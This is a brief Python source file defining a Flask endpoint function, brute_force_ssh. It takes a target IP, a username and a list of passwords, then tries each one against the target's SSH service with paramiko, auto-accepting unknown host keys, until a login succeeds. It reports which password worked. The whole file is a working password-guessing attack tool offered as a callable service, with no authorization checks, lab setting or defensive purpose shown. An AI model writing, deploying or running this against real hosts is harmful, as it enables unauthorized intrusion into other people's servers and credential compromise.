import paramiko
from flask import jsonify

def brute_force_ssh(data):
    target_ip = data.get('ip')
    username = data.get('username')
    password_list = data.get('passwords')
    port = data.get('port', 22)

    if not target_ip or not username or not password_list:
        return jsonify({"error": "IP, username, and password list are required"}), 400

    results = []
    for password in password_list:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(target_ip, port=port, username=username, password=password, timeout=5)
            results.append({"password": password, "success": True})
            ssh_client.close()
            break
        except paramiko.AuthenticationException:
            results.append({"password": password, "success": False})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    return jsonify({"results": results}), 200
